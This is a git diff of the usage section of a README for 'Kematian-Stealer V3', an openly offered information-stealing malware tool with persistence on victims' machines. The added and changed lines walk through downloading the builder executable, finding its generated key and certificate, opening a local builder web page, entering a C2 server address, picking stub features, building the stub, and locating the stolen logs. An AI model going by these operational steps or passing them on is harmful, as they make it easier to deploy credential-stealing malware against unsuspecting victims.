@@ -47,12 +47,13 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 
 # Usage
 - Download [Builder](https://github.com/Somali-Devs/Kematian-Stealer-V3/releases/download/AutoBuild/main.exe) from the releases.
-- Open the builder you will get a message like this : `Private key and certificate have been generated and saved.`
-- The builder will also start a local server which will run on `https://127.0.0.1:8080` by default.
+- The builder will automatically generate your `private key` and `certificate` at first run, you can find them here `$env:appdata\Kematian-Stealer`
+- After opening the builder, it will also start a local server which will run on `https://127.0.0.1:8080` by default.
 - Open your web browser and go to `https://127.0.0.1:8080/builder`
 - Input your C2 server in the `TCP TUNNEL URL:PORT` section
 - Next, activate the checkboxes for the features you want to include in the stub.
 - Finally hit build and the output stub will be placed in the same folder with the builder
+- Your logs will be saved here : `$env:appdata\Kematian-Stealer\logs`
  
  > [!NOTE]   
  > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**
